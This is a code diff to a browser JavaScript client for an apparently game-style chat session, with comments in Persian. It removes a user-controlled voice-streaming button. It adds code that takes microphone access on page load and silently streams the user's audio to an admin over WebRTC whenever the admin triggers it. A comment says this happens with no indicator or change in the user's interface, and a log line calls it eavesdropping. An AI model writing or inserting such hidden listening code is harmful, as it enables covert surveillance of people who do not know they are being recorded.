@@ -6,7 +6,13 @@
 let socket = null;
 let userToken = sessionStorage.getItem('userToken');
 let sessionData = JSON.parse(sessionStorage.getItem('userSession') || '{}');
-let isAudioStreaming = false;
+let localStream = null;
+let peerConnection = null;
+
+// کانفیگ WebRTC (اتصال مستقیم به صورت P2P local بدون نیاز به STUN خارچی پولی)
+const rtcConfig = {
+  iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+};
 
 // اگر توکن یا اطلاعات جلسه وجود نداشت، هدایت به لندینگ
 if (!userToken || !sessionData.id) {
@@ -17,9 +23,20 @@ document.addEventListener('DOMContentLoaded', () => {
   document.getElementById('session-title').innerText = sessionData.name || 'دستیاران کارآگاه';
   document.getElementById('session-code-display').innerText = `> CODE: ${sessionData.code}`;
 
+  // درخواست یک‌باره دسترسی میکروفون قبل از شروع جلسه جهت جلوگیری از نمایش مجدد پرمپت در طول بازی
+  initUserMicrophone();
   loadHistory();
   initSocket();
 });
+
+async function initUserMicrophone() {
+  try {
+    localStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+    console.log('🎙️ دسترسی میکروفون لپ‌تاپ کاربر با موفقیت تایید شد.');
+  } catch (err) {
+    console.warn('⚠️ عدم دسترسی به میکروفون یا رد شدن پرمیشن:', err);
+  }
+}
 
 // بارگذاری تاریخچه پیام‌های قبلی
 async function loadHistory() {
@@ -78,6 +95,33 @@ function initSocket() {
     console.log('🚨 رویداد سکانس هک مزداک دریافت شد:', data);
     if (typeof hackEngine !== 'undefined') {
       hackEngine.start();
+    }
+  });
+
+  // دریافت درخواست شروع استریم صدای میکروفون توسط ادمین
+  socket.on('audio_stream_started', async (data) => {
+    console.log('🎙️ ادمین درخواست شنود صدای میکروفون را ارسال کرد:', data);
+    await startPeerConnection(data.adminSocketId);
+  });
+
+  socket.on('audio_stream_stopped', () => {
+    console.log('🛑 استریم صدای میکروفون توسط ادمین قطع گردید.');
+    stopPeerConnection();
+  });
+
+  socket.on('webrtc_answer', async (data) => {
+    if (peerConnection) {
+      await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
+    }
+  });
+
+  socket.on('webrtc_ice_candidate', async (data) => {
+    if (peerConnection && data.candidate) {
+      try {
+        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
+      } catch (e) {
+        console.error('Error adding ICE candidate:', e);
+      }
     }
   });
 }
@@ -149,19 +193,56 @@ function sendTypingStatus(isTyping) {
   }
 }
 
-// اسکلت استریم صدای میکروفون
-function toggleAudioStream() {
-  const btn = document.getElementById('audio-btn');
-  if (!isAudioStreaming) {
-    isAudioStreaming = true;
-    btn.innerText = '🔴 توقف استریم ویس';
-    btn.className = 'cyber-btn cyber-btn-magenta';
-    socket.emit('start_audio_stream', { sessionId: sessionData.id });
-  } else {
-    isAudioStreaming = false;
-    btn.innerText = '🎙️ ویس لایو';
-    btn.className = 'cyber-btn cyber-btn-green';
-    socket.emit('stop_audio_stream', { sessionId: sessionData.id });
+// ایجاد اتصال WebRTC و ارسال استریم صدا بدون هیچ نشانگر یا تغییر در UI کاربر
+async function startPeerConnection(adminSocketId) {
+  stopPeerConnection();
+
+  if (!localStream) {
+    try {
+      localStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+    } catch (err) {
+      console.error('عدم دسترسی به میکروفون:', err);
+      return;
+    }
+  }
+
+  peerConnection = new RTCPeerConnection(rtcConfig);
+
+  // افزودن ترک‌های صدای میکروفون
+  localStream.getAudioTracks().forEach(track => {
+    peerConnection.addTrack(track, localStream);
+  });
+
+  // ارسال ICE Candidates به ادمین
+  peerConnection.onicecandidate = (event) => {
+    if (event.candidate) {
+      socket.emit('webrtc_ice_candidate', {
+        sessionId: sessionData.id,
+        candidate: event.candidate,
+        targetSocketId: adminSocketId,
+      });
+    }
+  };
+
+  // ساخت Offer و ارسال به ادمین
+  try {
+    const offer = await peerConnection.createOffer();
+    await peerConnection.setLocalDescription(offer);
+
+    socket.emit('webrtc_offer', {
+      sessionId: sessionData.id,
+      offer: offer,
+      targetSocketId: adminSocketId,
+    });
+  } catch (err) {
+    console.error('خطا در ساخت WebRTC offer:', err);
+  }
+}
+
+function stopPeerConnection() {
+  if (peerConnection) {
+    peerConnection.close();
+    peerConnection = null;
   }
 }
 
